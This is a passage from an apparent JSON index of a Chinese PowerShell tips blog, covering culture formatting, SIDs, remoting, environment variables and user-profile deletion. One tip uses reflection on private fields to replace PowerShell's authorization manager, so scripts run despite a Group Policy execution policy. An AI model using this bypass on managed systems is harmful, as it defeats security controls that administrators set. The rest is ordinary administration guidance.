转换区域性特定的信息","text":"假设您以文本的形式收到了数字或日期等数据。当信息转为文本的时候，您会遇到区域性特定的格式：不同区域的小数点和日期时间可能会不同。 以下是一个如何解析数据的简单例子，假设您知道它的来源区域信息： 123456# number in German format$info = '1,2'# convert to real value$culture = New-Object -TypeName CultureInfo(&quot;de&quot;)$number = [Double]::Parse($info,$culture) 每一个目标类型有一个 Parse() 方法，所以如果您收到一个日期和/或时间信息，您可以将它如此简单地转换它。这个例子输入的是以法国标准格式化的日期和时间，并返回一个真正的 DateTime 对象： 1234567# date and time in French format:$info = '01/11/2017 16:28:45'# convert to real value$culture = New-Object -TypeName CultureInfo(&quot;fr&quot;)$date = [DateTime]::Parse($info,$culture)$date","link":"/2017/12/08/converting-culture-specific-information/"},{"title":"PowerShell 技能连载 - 将信息转换为区域性特定的文本","text":"如果您希望将信息转换为指定的区域标准，那么可以轻松地用 ToString() 方法和合适的目标信息。 这个例子将短浅的日期和时间转换为法国的格式： 1234$date = Get-Date$frenchCulture = New-Object -TypeName CultureInfo(&quot;fr&quot;)$dateString = $date.ToString($frenchCulture)$dateString 当您选择了泰国区域，您会注意到一个完全不同的年份，因为泰国使用不同的日历模型： 1234$date = Get-Date$thaiCulture = New-Object -TypeName CultureInfo(&quot;th&quot;)$dateString = $date.ToString($thaiCulture)$dateString 当您选择了一个不同的区域，Windows 也会相应地翻译并显示月份和日期名称： 1234$date = Get-Date$chineseCulture = New-Object -TypeName CultureInfo(&quot;zh&quot;)$dateString = $date.ToString('dddd dd.MMMM yyyy',$chineseCulture)$dateString 结果类似这样： 星期三 01.十一月 2017","link":"/2017/12/11/converting-information-to-culture-specific-text/"},{"title":"PowerShell 技能连载 - 在 Grid View 窗口中垂直显示数据","text":"Out-GridView 总是以每个对象一行的方式生成表格： 1Get-Process -Id $pid | Out-GridView 有些时候，在 grid view 窗口中垂直显示对象属性，每个属性一行，更有用。 要做到这个效果，请看看 Flip-Object：这个函数输入对象，并将它们按每个属性分割成独立的键-值对象。它们可以通过管道导到 Out-GridView 中。通过这种方式，对象属性可以以更详细的方式查看： 1Get-Process -Id $pid | Flip-Object | Out-GridView 以下是 Flip-Object 函数的实现： 123456789101112131415161718192021222324252627function Flip-Object{ param ( [Object] [Parameter(Mandatory=$true, ValueFromPipeline=$true)] $InputObject ) process { $InputObject | ForEach-Object { $instance = $_ $instance | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | ForEach-Object { [PSCustomObject]@{ Name = $_ Value = $instance.$_ } } } }}","link":"/2017/12/12/displaying-data-in-a-grid-view-window-vertically/"},{"title":"PowerShell 技能连载 - 将用户名转换为 SID","text":"以下代码演示了如何查找一个用户名的 SID： 12$domain = 'MyDomain'$username = 'User01' 123$sid = (New-Object Security.Principal.NTAccount($domain, $username)).Translate([Security.Principal.SecurityIdentifier]).Value$sid 只需要确保正确地调整了域名和用户名。如果您需要查看本地用户的 SID，只需要将域名设置为本地计算机的名称。 12345$username = 'Administrator'$sid = (New-Object Security.Principal.NTAccount($env:computername, $username)).Translate([Security.Principal.SecurityIdentifier]).Value$sid 这在 PowerShell 5 中更简单，因为有一个新的 Get-LocalUser cmdlet： 12345678PS C:\\&gt; Get-LocalUser | Select-Object -Property Name, SidName SID---- ---Administrator S-1-5-21-2951074159-1791007430-3873049619-500CCIE S-1-5-21-2951074159-1791007430-3873049619-1000DefaultAccount S-1-5-21-2951074159-1791007430-3873049619-503Guest S-1-5-21-2951074159-1791007430-3873049619-501","link":"/2017/12/14/converting-user-name-to-sid/"},{"title":"PowerShell 技能连载 - 测试运行 PowerShell 6 - 并行运行","text":"PowerShell 可以下载并和 Windows 官方的 PowerShell 并行运行。如果您想测试运行它，请访问 https://github.com/PowerShell/PowerShell/releases，并选择合适您平台的发布版本。 其注意要下载 50MB 内容。当解压/安装发行版之后，将会得到一个全黑的 PowerShell 图标，代表 PowerShell 6。文件名也改了：可执行文件名不再是 “powershell.exe” 而是 “pwsh.exe”。","link":"/2017/12/13/test-drive-powershell-6-side-by-side/"},{"title":"PowerShell 技能连载 - 格式化文本输出","text":"如果您希望将输出文本格式化漂亮，您可能需要用 PSCustomObject 并且将它输出为一个格式化的列表，例如： 1234567$infos = [PSCustomObject]@{ Success = $true Datum = Get-Date ID = 123}Write-Host ($infos| Format-List | Out-String) -ForegroundColor Yellow 实际使用时只需要增加或者调整哈希表中的键即可。","link":"/2017/12/15/formatting-text-output-1233637440/"},{"title":"PowerShell 技能连载 - 覆盖 Execution Policy 设置","text":"如果 PowerShell 不允许执行脚本，您可能需要先允许脚本执行，例如： 1Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force 当 execution policy 是在组策略中定义时，这样操作不会起作用，因为组策略设置优先级更高： 123456789PS C:\\&gt; Get-ExecutionPolicy -List Scope ExecutionPolicy ----- ---------------MachinePolicy Restricted UserPolicy Undefined Process Bypass CurrentUser Bypass LocalMachine Undefined 在这种情况下，您可以将 PowerShell 内置的授权管理器替换成一个新的。只需要运行以下代码，PowerShell 将总是允许在指定的会话中执行脚本： 123$context = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext);$field = $context.gettype().getfield('_authorizationManager','nonpublic,instance');$field.setvalue($context,(new-object management.automation.authorizationmanager 'Microsoft.PowerShell'))","link":"/2017/12/18/execution-policy-override/"},{"title":"PowerShell 技能连载 - 将机器加入域","text":"以下是 PowerShell 将机器加入 AD 域的基本步骤： 123456789101112# do not store passwords in production solutions,# or you MUST control access permissions to this sensitive data$username = &quot;mydomain\\UserName&quot;$password = 'Password' | ConvertTo-SecureString -AsPlainText -Force$domainName = 'NameOfDomain'# convert username and password to a credential$cred = [PSCredential]::new($username, $password)# join computerAdd-Computer -DomainName $domainName -Credential $cred# restart computerRestart-Computer 您可以根据需要修改这段代码。这个例子中用明文存储密码，这是不安全的。您可能需要从一个文件中读取密码。","link":"/2017/12/19/joining-computers-to-a-domain/"},{"title":"PowerShell 技能连载 - 以 JSON 格式读取和保存选项","text":"如果您想在脚本中保存信息，您也许希望将数据保存成 JSON 格式的对象。以下是一个例子： 12345678910111213141516# define options object$options = [PSCustomObject]@{ Color = 'Red' Height = 12 Name = 'Weltner'}# play with options settings$options.Color = 'Blue'# save options to file$Path = &quot;c:\\test\\options.json&quot;$options | ConvertTo-Json | Set-Content -Path $Path# load options from file$options2 = Get-Content -Path $Path | ConvertTo-Json 请确保路径 “c:\\test” 存在。脚本将创建一个包含指定数据的自定义对象，并将它以 JSON 的格式保存到磁盘。下一步，数据将在您需要的时候读取出来。例如在另外一个脚本中，或读取初始设置时。","link":"/2017/12/20/loading-and-saving-options-in-json-format/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 远程处理","text":"如果您想试试 PowerShell 远程处理，您至少需要在目标机器（您希望访问的机器）上启用它。要使用它，您需要目标机器上的本地管理员特权。请用管理员特权打开 PowerShell，并且运行以下代码： 1234#requires -RunAsAdministrator# manually enable PowerShell remotingEnable-PSRemoting -SkipNetworkProfileCheck -Force 接下来，在另一台能通过网络访问的计算机上，运行运行 PowerShell 远程处理的 “Ping“ 来测试是否能连上目标机器： 1234# &quot;ping&quot; for PowerShell remoting# tests anonymously whether you can reach the target$IPorNameTargetComputer = 'place name or IP address here'Test-WSMan $IPorNameTargetComputer 当目标机器响应时，Test-WSMan 返回类似以下的文本。它进行了一个匿名测试，所以如果它失败了，您就知道防火墙或者目标机器的配置有问题。 wsmid : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd ProductVendor : Microsoft Corporation ProductVersion : OS: 0.0.0 SP: 0.0 Stack: 3.0 在下一个技能中，我们将看看能用 PowerShell 远程处理来做什么，以及如何远程执行脚本。","link":"/2017/12/21/playing-with-powershell-remoting/"},{"title":"PowerShell 技能连载 - 通过 PowerShell 远程处理操作远程机器","text":"当您在目标机器上启用了 PowerShell 远程处理，请试试交互式地连接它。以下是您值得尝试的例子。只需要确保将 targetComputerName 替换成您需要连接的目标机器名即可： 123456789PS C:\\&gt; Enter-PSSession -ComputerName targetComputerName[targetComputerName]: PS C:\\Users\\User12\\Documents&gt; $env:COMPUTERNAMETARGETCOMPUTERNAME[targetComputerName]: PS C:\\Users\\User12\\Documents&gt; exitPS C:\\&gt; $env:COMPUTERNAMEYOURCOMPUTERNAME 如果连接失败并且报 “Access Denied” 错误，您可能需要使用 -Credential 参数并且使用一个不同的用户账户来登录远程计算机。您可能需要本地管理员特权。 如果连接失败并且报告 RDP 错误，或者如果 WinRM 无法找到目标计算机名，请使用 Test-WSMan 检查连接。如果这无法连接上，请重新检查远程设置。您可能需要像之前的技能中描述的那样，先在目标机器上运行 Enable-PSRemoting。 请不要运行会打开窗口的命令。只能运行产生文本信息的命令。 要离开远程会话，请使用 exit 命令。","link":"/2017/12/22/accessing-remote-machines-via-powershell-remoting/"},{"title":"PowerShell 技能连载 - 在多台计算机中并行运行命令","text":"假设您已经启用了 PowerShell 远程处理（请看我们之前的技能），那么您可以同时在多台计算机上运行命令。 以下例子演示了这个操作，并且在列表中所有计算机中所有用户的桌面上放置一个文件。警告：这是个很强大的脚本。它将在列表中的所有机器上运行 $code 中的任何代码，假设启用了远程处理，并且您有相应的权限： 12345678910# list of computers to connect to$listOfComputers = 'PC10','TRAIN1','TRAIN2','AD001'# exclude your own computer$listOfComputers = $listOfComputers -ne $env:COMPUTERNAME# code to execute remotely$code = {&quot;Hello&quot; | Out-File -FilePath &quot;c:\\users\\Public\\Desktop\\result.txt&quot;}# invoke code on all machinesInvoke-Command -ScriptBlock $code -ComputerName $listOfComputers -Throttle 1000 例如，如果您将 $code 中的代码替换为 Stop-Computer -Force，所有机器将会被关闭。","link":"/2017/12/25/running-commands-on-multiple-computers-in-parallel/"},{"title":"PowerShell 技能连载 - 管理用户配置文件","text":"要转储一台机子上用户配置文件的原始列表，请使用这行代码： 1Get-CimInstance -Class Win32_UserProfile | Out-GridView 您将会获得所有用户配置文件的所有详细信息。用户名可以在 SID 属性中找到，但它是以 SID 的格式表示。要获得真实的用户名，需要将 SID 转换。这段代码创建一个以真实用户名为字段名的哈希表： 1234567$userProfiles = Get-CimInstance -Class Win32_UserProfile | # add property &quot;UserName&quot; that translates SID to username Add-Member -MemberType ScriptProperty -Name UserName -Value { ([Security.Principal.SecurityIdentifier]$this.SID).Translate([Security.Principal.NTAccount]).Value } -PassThru | # create a hash table that uses &quot;Username&quot; as key Group-Object -Property UserName -AsHashTable -AsString 现在可以轻松地转储机器上所有带用户配置文件的用户列表了： 12345678910PS C:\\&gt; $userProfiles.Keys | Sort-ObjectMYDOMAIN\\AdministratorMYDOMAIN\\User01MYDOMAIN\\User02MYDOMAIN\\User03MYDOMAIN\\User12NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEMPC10\\User 要获取某个用户配置文件的详细信息，请访问哈希表的字段： 12345678910111213141516171819202122232425262728293031323334PS C:\\&gt; $userProfiles[&quot;MYDOMAIN\\User01&quot;]UserName : MYDOMAIN\\User01AppDataRoaming : Win32_FolderRedirectionHealthContacts : Win32_FolderRedirectionHealthDesktop : Win32_FolderRedirectionHealthDocuments : Win32_FolderRedirectionHealthDownloads : Win32_FolderRedirectionHealthFavorites : Win32_FolderRedirectionHealthHealthStatus : 3LastAttemptedProfileDownloadTime :LastAttemptedProfileUploadTime :LastBackgroundRegistryUploadTime :LastDownloadTime :LastUploadTime :LastUseTime :Links : Win32_FolderRedirectionHealthLoaded : FalseLocalPath : C:\\Users\\User01Music : Win32_FolderRedirectionHealthPictures : Win32_FolderRedirectionHealthRefCount :RoamingConfigured : FalseRoamingPath :RoamingPreference :SavedGames : Win32_FolderRedirectionHealthSearches : Win32_FolderRedirectionHealthSID : S-1-5-21-3860347202-3037956370-3782488958-1604Special : FalseStartMenu : Win32_FolderRedirectionHealthStatus : 0Videos : Win32_FolderRedirectionHealthPSComputerName :","link":"/2017/12/26/managing-user-profiles/"},{"title":"PowerShell 技能连载 - 删除用户配置文件","text":"当一个用户登录计算机时，将创建一套用户配置文件。在前一个技能中我们介绍了如何用 PowerShell 转储计算机中的用户配置文件列表。 如果您想删除一个用户账户，PowerShell 可以帮您清除。以下是使用方法： 首先，调整 $domain 和 $username 变量指向您想删除的用户配置文件。然后，在 PowerShell 中以管理员特权运行以下代码： 123456789101112#requires -RunAsAdministrator$domain = 'ccie'$username = 'user01'# get user SID$sid = (New-Object Security.Principal.NTAccount($domain, $username)).Translate([Security.Principal.SecurityIdentifier]).ValueGet-WmiObject -ClassName Win32_UserProfile -Filter &quot;SID='$sid'&quot; | ForEach-Object { $_.Delete() } 第一部分将用户名转换为 SID 并且用它来指定用户配置文件。WMI 的 Delete() 方法删除所有用户配置文件。注意：您将丢失删除的用户配置文件中的所有数据。","link":"/2017/12/27/deleting-user-profiles/"},{"title":"PowerShell 技能连载 - 在剪贴板中附加内容","text":"PowerShell 5 带来了新的将文本复制到剪贴板，以及取出剪贴板文本的 cmdlet：Set-Clipboard 和 Get-Clipboard。 Set-Clipboard 也支持 -Append 参数，它可以向剪贴板尾部附加文本。这可以成为一种新奇且有用的记录脚本行为的方法： 12345678910Set-ClipBoard &quot;Starting at $(Get-Date)&quot;1..30 | ForEach-Object { Set-ClipBoard -Append &quot;Iteration $_&quot; $wait = Get-Random -Minimum 1 -Maximum 5 Set-ClipBoard -Append &quot;Waiting $wait seconds&quot; Start-Sleep -Seconds $wait &quot;Processing $_&quot; } 这个脚本片段使用 Set-Clipboard 将信息粘贴至剪贴板中。脚本运行后，您可以将剪贴板内容粘贴至剪贴板来查看脚本输出的日志。","link":"/2017/12/28/appending-the-clipboard/"},{"title":"PowerShell 技能连载 - 设置环境变量","text":"有些时候您会见到一些脚本使用 Select-Object 向现有的对象附加信息，类似以下代码： 123456Get-Process | Select-Object -Property *, Sender| ForEach-Object { $_.Sender = $env:COMPUTERNAME $_ } 它可以工作，但是 Select-Object 创建了一个完整的对象拷贝，所以这种方法速度很慢而且改变了对象的类型。您可能注意到了 PowerShell 不再使用正常的表格方式输出进程对象，也是因为这个原因。 如果您想设置环境变量，env: 驱动器只能修改进程级别的环境变量。要设置用户或者机器级别的环境变量，请试试这个函数： 1234567891011121314151617function Set-EnvironmentVariable{ [CmdletBinding()] param ( [Parameter(Mandatory)][String] $VariableName, [Parameter(Mandatory)][String] $VariableValue, [Parameter(Mandatory)][EnvironmentVariableTarget] $Target ) [Environment]::SetEnvironmentVariable($VariableName, $VariableValue, $Target)} 请注意 $Target 变量如何使用特殊的数据类型 “EnvironmentVariableTarget” ，当您在 PowerShell ISE 或其它带有 IntelliSense 功能的编辑器中，-Target 参数的可选项有 “Process”、”User” 和 “Machine”。 以下是如何在用户级别创建名为 “Test”，值为 12 的环境变量的方法： 123PS C:\\&gt; Set-EnvironmentVariable -VariableName test -VariableValue 12 -Target UserPS C:\\&gt;","link":"/2017/12/29/settingenvironmentvariables/"},{"title":"PowerShell 技能连载 - 删除环境变量","text":"在前一个技能中我们解释了如何在所有可用的范围内设置环境变量的方法。但是如何移除环境变量呢？ 巧合地，您可以用完全相同的方法做这件事情，只需要将一个空字符串赋给该变量。然而，前一个技能中的函数中的 -VariableValue 参数不能接受空字符串： 1234567891011121314151617function Set-EnvironmentVariable{ [CmdletBinding()] param ( [Parameter(Mandatory)][String] $VariableName, [Parameter(Mandatory)][String] $VariableValue, [Parameter(Mandatory)][EnvironmentVariableTarget] $Target ) [Environment]::SetEnvironmentVariable($VariableName, $VariableValue, $Target)} 当您尝试着赋值空字符串时，将会收到这样的提示： 123PS C:\\&gt; Set-EnvironmentVariable -VariableName test -VariableValue &quot;&quot; -Target UserSet-EnvironmentVariable : Cannot bind Argument to Parameter &quot;VariableValue&quot; because it is an empty string.... 这是因为当您将一个参数声明为 “Mandatory”，PowerShell 缺省情况下将拒绝空字符串和 null 值。 您可以将 VariableValue 参数设为可选的，但是这样当您调用该函数不传该参数时，PowerShell 将不再提示。如何使一个必选参数能接受 null 和空字符串呢？ 只要稍微改一下，加上 [AllowNull()] 和/或 [AllowEmptyString()] 以上函数就可以支持删除环境变量： 123456789101112131415161718function Set-EnvironmentVariable{ [CmdletBinding()] param ( [Parameter(Mandatory)][String] $VariableName, [Parameter(Mandatory)][String] [AllowEmptyString()] $VariableValue, [Parameter(Mandatory)][EnvironmentVariableTarget] $Target ) [Environment]::SetEnvironmentVariable($VariableName, $VariableValue, $Target)} 以下是删除 “Test” 环境变量的方法： 1PS C:\\&gt; Set-EnvironmentVariable -VariableName test -VariableValue &quot;&quot; -Target User","link":"/2018/01/01/deleting-environment-variables/"},{"title":"PowerShell 技能连载 - 按数据类型绑定参数","text":"PowerShell 可以根据数据类型匹配自动地绑定参数。以下是一个体现该特性的示例 1234567891011121314151617181920212223242526272829303132function Test-Binding{ [CmdletBinding(DefaultParameterSetName='Date')] param ( [Parameter(ParameterSetName='Integer', Position=0, Mandatory=$true)] [int] $Id, [Parameter(ParameterSetName='String', Position=0, Mandatory=$true)] [string] $Name, [Parameter(ParameterSetName='Date', Position=0, Mandatory=$true)] [datetime] $Date ) $chosenParameterSet = $PSCmdlet.ParameterSetName Switch ($chosenParameterSet) { 'Integer' { 'User has chosen Integer' } 'String' { 'User has chosen String' } 'Date' { 'User has chosen Date' } } [PSCustomObject]@{ Integer = $Id String = $Name Date = $Date }} 现在用户可以测试 Test-Binding 并且提交参数： 123456789101112131415161718192021222324PS C:\\&gt; Test-Binding &quot;Hello&quot;User has chosen StringInteger String Date------- ------ ---- 0 HelloPS C:\\&gt; Test-Binding 12User has chosen IntegerInteger String Date------- ------ ---- 12PS C:\\&gt; Test-Binding (Get-Date)User has chosen DateInteger String Date------- ------ ---- 0 11/21/2017 11:44:33 AM","link":"/2018/01/02/binding-parameters-by-data-type/"},{"title":"PowerShell 技能连载 - 在 PowerShell 函数中支持风险缓解","text":"当一个 PowerShell 函数进行一个可能有风险的系统变更时，推荐使用 -WhatIf 和 -Configm 风险缓解参数。以下是基本的需求： 1234567891011121314151617function Test-WhatIf{ [CmdletBinding(SupportsShouldProcess,ConfirmImpact='Low',HelpUri='http://www.myhelp.com')] param() if ($PSCmdlet.ShouldProcess($env:COMPUTERNAME,&quot;Say 'Hello'&quot;)) { &quot;I am executing...&quot; } else { &quot;I am simulating...&quot; }} 当运行这个函数时，PowerShell 会遵从 -WhatIf 和 -Confirm 参数设置： 12345678PS C:\\&gt; Test-WhatIf -WhatIfWhat if: Performing the operation &quot;Say 'Hello'&quot; on target &quot;PC10&quot;.I am simulating...PS C:\\&gt; Test-WhatIfI am executing...PS C:\\&gt; 这个函数还定义了一个 ConfirmImpact 属性，它的值可以是 Low、Medium 或 High，表示这个函数的操作引起的改变有多严重。 当 ConfirmImpact 的值大于或等于 $ConfirmPreference 变量中定义的值时，PowerShell 自动向用户显示一个确认信息： 12345678910PS C:\\&gt; $ConfirmPreference = &quot;Low&quot;PS C:\\&gt; Test-WhatIfI am executing...ConfirmationDo you really want to perform this action?...I am simulating...","link":"/2018/01/03/supporting-risk-mitigation-in-powershell-functions/"},{"title":"PowerShell 技能连载 - 正确地导入 Excel 的 CSV 文件","text":"如果您导出一个 Excel 工作表到 CSV 文件中，并且希望将这个文件导入 PowerShell，以下是实现方法： 123$path = 'D:\\sampledata.csv'Import-Csv -Path $path -UseCulture -Encoding Default 重要的参数有 -UseCulture（自动使用和 Excel 在您系统中所使用一致的分隔符）和 -Encoding Default（只有使用此设置，所有特殊字符才能保持原样）。","link":"/2018/01/04/correctly-importing-excel-csv-files/"},{"title":"PowerShell 技能连载 - 使用缺省参数值","text":"您可能听说过 PowerShell 的缺省参数值和 $PSDefaultParameterValues。当您将一个哈希表赋给这个特殊的变量，则哈希表的键定义了命令和影响的参数，而值定对应新的缺省值。 请看这个例子： 123$PSDefaultParameterValues = @{ '*:ComputerName' = 'testserver1'} 这将会把所有命令 (*) 的 -ComputerName 设置为新的缺省值 “testserver1”。当您调用一个命令，且满足以下两个条件 (a) 有一个名为 ComputerName 的参数 (b) 没有显式地赋值给这个参数时，将会使用缺省值。 这对 PowerShell 函数也有效，然而只对 “Advanced Functions” 有效，对 “Simple Functions” 无效。 要验证区别，请按上述介绍定义 $PSDefaultParameterValues，然后运行这段代码： 12345678910111213141516171819function testSimple{ param($Computername) &quot;Result Simple: $Computername&quot;}function testAdvanced{ [CmdletBinding()] param($Computername) &quot;Result Advanced: $Computername&quot;}testSimpletestAdvanced 如您所见，只有 testAdvanced 函数应用了缺省参数。”Advanced Functions” 至少要定义一个参数属性，例如 [CmdletBinding()] 或 [Parameter(Mandatory)]。","link":"/2018/01/05/using-default-parametervalues/"},{"title":"PowerShell 技能连载 - 转换数字字符串","text":"在 PowerShell 中转换一个包含数字的字符串非常简单： 1234PS C:\\&gt; [double]&quot;77.234&quot;77,234PS C:\\&gt; 不过，如果字符串包含的不只是纯数字，那么就比较有挑战性了。例如，您需要转换一个类似 “2763MB” 的字符串，PowerShell 无法自动将它转换为一个数字。这时候您需要一个类似这样的转换函数： 1234567function Convert-MBToByte($MBString){ $number = $MBString.Substring(0, $MBString.Length-2) 1MB * $number}Convert-MBToByte -MBString '2433MB' 或者如果它是一个合法的 PowerShell 代码格式，您可以试着让 PowerShell 来做转换： 1234PS C:\\&gt; Invoke-Expression -Command '2615MB'2742026240PS C:\\&gt; 然而，不推荐使用 Invoke-Expression，因为它会带来安全风险。例如用户能够改变命令执行的表达式，类似 SQL 注入攻击。","link":"/2018/01/08/converting-numeric-strings/"},{"title":"PowerShell 技能连载 - 用 Group-Object 区分远程处理结果","text":"当您需要通过 PowerShell 远程处理来获取多台计算机的信息时，您可以单独查询每台机器。更快的方法是同时查询多台机器，这也产生一个问题，如何区分处理结果呢？ 以下是一个例子（假设您的环境中启用了 PowerShell 远程操作）： 12345678910111213141516$serverList = 'TRAIN11','TRAIN12'$code = { Get-Service}# get results from all machines in parallel...$results = Invoke-Command -ScriptBlock $code -ComputerName $serverList | # and separate results by PSComputerName Group-Object -Property PSComputerName -AsHashTable -AsString$results['TRAIN11']$results['TRAIN12'] 如您所见，Invoke-Command 命令从两台机器返回了所请求的服务信息。接下来 Group-Object 命令将数据分离到两个组里，并且使用 PSComputerName 属性来标识它。PSComputerName 是一个自动属性，通过 PowerShell 远程处理接收到的数据总是带有这个属性。 这样，即便 PowerShell 远程处理在所有机器上并行执行代码，我们也可以区分每台机器的执行结果。","link":"/2018/01/09/using-group-object-to-separate-remoting-results/"},{"title":"PowerShell 技能连载 - 理解和避免双跃点问题","text":"当一个脚本在远程执行时，您可能会遇到“拒绝访问”的问题，这通常和双跃点 (double-hop) 问题有关。以下是一个例子，并且我们将演示如何解决它： 12345678$target = 'serverA'$code = { # access data from another server with transparent authentication Get-WmiObject -Class Win32_BIOS -ComputerName serverB}Invoke-Command -ScriptBlock $code -ComputerName $target 以上脚本在 ServerA 服务器上执行 PowerShell 代码。远程执行的代码试图连接 ServerB 来获取 BIOS 信息。请不要介意这是否有现实意义，有关系的是远程执行的代码无法透明地登录 ServerB，即便执行这段代码的用户可以直接访问 ServerB。 双跃点问题发生在您的认证信息没有从一个远程计算机传递给另一台远程计算机时。对于任何非域控制计算机，双跃点缺省都是禁止的。 如果您想使用上述代码，您需要使用 CredSSP 来验证（远程桌面也使用了这项技术）。这需要一次性设置您和您直接访问的计算机（在这个例子中是 ServerA）之间的信任关系： 1234567891011#requires -RunAsAdministrator$TargetServer = 'ServerA'# configure the computer you directly connect toInvoke-Command -ScriptBlock { Enable-WSManCredSSP -Role Server -Force | Out-String } -ComputerName $TargetServer# establish CredSSP trustEnable-WSManCredSSP -Role Client -DelegateComputer $TargetServer -Force 当这个信任存在时，您可以使用 CredSSP 规避双跃点问题。以下是如何在 CredSSP 启用的情况下如何远程运行代码的方法： 12Invoke-Command -ScriptBlock $code -ComputerName $target-Authentication Credssp -Credential mydomain\\myUser 当您使用 CredSSP 时，您不再能使用透明的登录。取而代之的是，您必须使用 -Credential 来指定用户账户。","link":"/2018/01/10/understanding-and-avoiding-double-hop/"},{"title":"PowerShell 技能连载 - 列出用户配置文件","text":"我们收到很多反馈，关于如何处理用户配置文件的技能，所以我们决定增加几个额外的技能。 WMI 可以方便地枚举出系统中所有用户的配置文件，但是只列出了 SID (security identifier)，而不是明文的用户名。 12Get-CimInstance -ClassName Win32_UserProfile | Out-GridView 要改进这个结果，以下是一小段将 SID 转换为用户名的示例代码： 12$sid = &quot;S-1-5-32-544&quot;(New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value 要向 Get-CimInstance 指令的输出结果添加明文的用户名，您可以使用 Add-Member 指令和 ScriptProperty 属性： 123Get-CimInstance -ClassName Win32_UserProfile | Add-Member -MemberType ScriptProperty -Name UserName -Value { (New-Object System.Security.Principal.SecurityIdentifier($this.Sid)).Translate([System.Security.Principal.NTAccount]).Value } -PassThru | Out-GridView 网格视图显示了一个名为 UserName 的额外列，其中包括指定用户配置文件的明文用户名。","link":"/2018/01/11/list-user-profiles/"},{"title":"PowerShell 技能连载 - 查找用户配置文件","text":"我们收到了许多关于处理用户配置文件的技能的反馈，所以我们决定增加一系列额外的技能文章。 通常，每次当用户登录一个系统时，无论是本地登录还是远程登录，将会创建一个用户配置文件。所以随着时间的增长，可能会存在许多孤岛的用户配置文件。如果您想管理用户配置文件（包括删除不需要的），请确保排除系统使用的用户配置文件。它们可以通过 “Special” 属性来识别。 以下是一段在网格视图窗口中显示显示所有普通的用户配置文件，并且允许您选择一条记录的代码： 12345$selected = Get-CimInstance -ClassName Win32_UserProfile -Filter &quot;Special=False&quot; | Add-Member -MemberType ScriptProperty -Name UserName -Value { (New-Object System.Security.Principal.SecurityIdentifier($this.Sid)).Translate([System.Security.Principal.NTAccount]).Value } -PassThru | Out-GridView -Title &quot;Select User Profile&quot; -OutputMode Single$selected","link":"/2018/01/12/find-user-profiles/"},{"title":"PowerShell 技能连载 - 通过对话框移除用户配置文件","text":"我们收到了许多关于处理用户配置文件的技能的反馈，所以我们决定增加一系列额外的技能文章。 在前一个技能中我们演示了如何用 WMI 删除用户配置文件。有一些用户推荐使用 Remove-WmiObject 来替代 WMI 内部的 Delete() 方法。然而，Remove-WmiObject 无法删除用户配置文件实例。 以下代码汇总了我们在之前的技能中提到的所有细节。它列出所有用户配置文件，除了当前加载的和系统账户的。您可以选择一个，PowerShell 会帮您移除这个用户配置文件。 请注意以下代码并不会删除任何内容。要防止丢失数据，我们注释掉了删除操作的代码。当您去掉注释，真正地删除用户配置文件之前，请确保您知道会发生什么！ 123456789#requires -RunAsAdministratorGet-WmiObject -ClassName Win32_UserProfile -Filter &quot;Special=False AND Loaded=False&quot; | Add-Member -MemberType ScriptProperty -Name UserName -Value { (New-Object System.Security.Principal.SecurityIdentifier($this.Sid)).Translate([System.Security.Principal.NTAccount]).Value } -PassThru | Out-GridView -Title &quot;Select User Profile&quot; -OutputMode Single | ForEach-Object { # uncomment the line below to actually remove the selected user profile! #$_.Delete() } Are you an experienced professional PowerShell user? Then learning from default course work isn’t your thing. Consider learning the tricks of the trade from one another! Meet the most creative and sophisticated fellow PowerShellers, along with Microsoft PowerShell team members and PowerShell inventor Jeffrey Snover. Attend this years’ PowerShell Conference EU, taking place April 17-20 in Hanover, Germany, for the leading edge. 35 international top speakers, 80 sessions, and security workshops are waiting for you, including two exciting evening events. The conference is limited to 300 delegates. More details at www.psconf.eu.","link":"/2018/01/15/remove-user-profiles-via-dialog/"},{"title":"PowerShell 技能连载 - 通过对话框移除用户配置文件（第二部分）","text":"在前一个技能中我们演示了如何用一个用一个网格视图窗口显示所有可用的用户配置文件，并且可以选中一条并删除： 123456789#requires -RunAsAdministratorGet-WmiObject -ClassName Win32_UserProfile -Filter &quot;Special=False AND Loaded=False&quot; | Add-Member -MemberType ScriptProperty -Name UserName -Value { (New-Object System.Security.Principal.SecurityIdentifier($this.Sid)).Translate([System.Security.Principal.NTAccount]).Value } -PassThru | Out-GridView -Title &quot;Select User Profile&quot; -OutputMode Single | ForEach-Object { # uncomment the line below to actually remove the selected user profile! #$_.Delete() } 它可以像预期中的那样工作，网格视图窗口显示许多不需要的信息。如果您想用它作为一个服务桌面程序，您肯定只希望显示其中的一部分信息。 您当然可以在将结果通过管道导出到网格视图窗口之前使用 Select-Object 来控制显示哪些信息。然而，这将会改变数据的类型，而且这将导致无法访问对象的一些成员，例如使用 Delete() 来删除用户配置文件。 所以这是一个更普遍的问题： 如何用网格视图窗口来显示自定义数据，而当用户选择一条记录时，返回原始的对象？ 一个简单的方法是用 Group-Object 来创建一个哈希表：将原始的数据通过类似 “UserName” 等属性来分组。然后，在网格视图窗口中显示哈希表的键。当用户选择了一个对象时，将选中的作为键，来访问哈希表中的原始对象： 123456789101112#requires -RunAsAdministrator$hashTable = Get-WmiObject -ClassName Win32_UserProfile -Filter &quot;Special=False AND Loaded=False&quot; | Add-Member -MemberType ScriptProperty -Name UserName -Value { (New-Object System.Security.Principal.SecurityIdentifier($this.Sid)).Translate([System.Security.Principal.NTAccount]).Value } -PassThru | Group-Object -Property UserName -AsHashTable -AsString$hashTable.Keys | Sort-Object | Out-GridView -Title &quot;Select User Profile&quot; -OutputMode Single | ForEach-Object { # uncomment the line below to actually remove the selected user profile! # $hashTable[$_].Delete() 现在这个工具使用起来方便多了：网格视图窗口只显示用户名，而当您选择了一项后，可以获取到原始对象，进而做删除操作。","link":"/2018/01/16/removing-user-profiles-via-dialog-part-2/"},{"title":"PowerShell 技能连载 - 用网格视图窗口作为选择对话框（第一部分）","text":"如何使用网格视图窗口作为一个简单的选择对话框呢？ 